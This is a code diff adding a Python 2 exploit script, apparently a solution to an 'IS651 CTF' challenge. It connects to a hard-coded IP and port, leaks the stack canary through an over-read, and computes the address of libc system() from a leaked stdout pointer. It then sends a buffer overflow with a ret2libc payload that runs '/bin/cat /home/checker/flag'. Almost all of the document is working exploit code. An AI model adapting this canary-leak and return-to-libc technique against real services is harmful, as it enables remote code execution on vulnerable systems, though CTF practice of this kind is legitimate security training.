@@ -1,0 +1,59 @@
+from socket import *
+import select
+import struct
+
+def le(*longNumbers):
+    return struct.pack('<' + 'L' * len(longNumbers), *longNumbers)
+
+def in2Byte(hexStr, pad=2):
+    return ' '.join(map(''.join, zip(*[iter(hexStr)]*pad)))
+
+def printSE(s):
+    if s:
+        print '(START)'
+        print in2Byte(data.encode("hex"), 2)
+        print '(END)\n'
+
+def get_data():
+    return le(1)
+
+def set_data(buf):
+    assert len(buf) % 4 == 0
+    l = len(buf)/4 + 0x80000000
+    return le(2, l) + buf
+
+def chk_alive(l, token = 'A'*30):
+    assert len(token) == 30
+    return le(3, l) + token
+
+def result(sock, func, *args):
+    sock.send(func(*args))
+    if func != set_data:
+        return sock.recv(10000)
+
+s = socket(AF_INET, SOCK_STREAM)
+if s.connect_ex(("143.248.38.212", 40008)) > 0:
+    print "Fail to connect"
+
+data = s.recv(10000) # blanks
+data = s.recv(10000) # IS651 CTF
+
+canary = result(s, chk_alive, 0x24)[-4:] # cannary value by over read the stack
+
+result(s, set_data, '')
+data = result(s, get_data)
+
+stdout = struct.unpack('<L', data[:4])[0] # address to stdout
+sysAddr = stdout + (0xf7792d60-0xf75dd700 - (0x1b3d60 - 0x3a840)) # calculation of the address to __libc_system
+bufAddr = struct.unpack('<L', data[4:8])[0] - 32 # address of user-controlled buffer
+sysArg = '/bin/cat /home/checker/flag\x00' # user buffer
+sysArg += 'A' * (4 - len(sysArg)%4) # Aligned by 4
+
+# call set_data with buffer to return to libc
+result(s, set_data, 'A' * 0x40 + canary + 'A' * 0xc + le(sysAddr) + 'fake' + le(bufAddr+0x5d) + sysArg)
+
+while 1:
+    data = s.recv(10000)
+    if data: print data
+
+s.close()
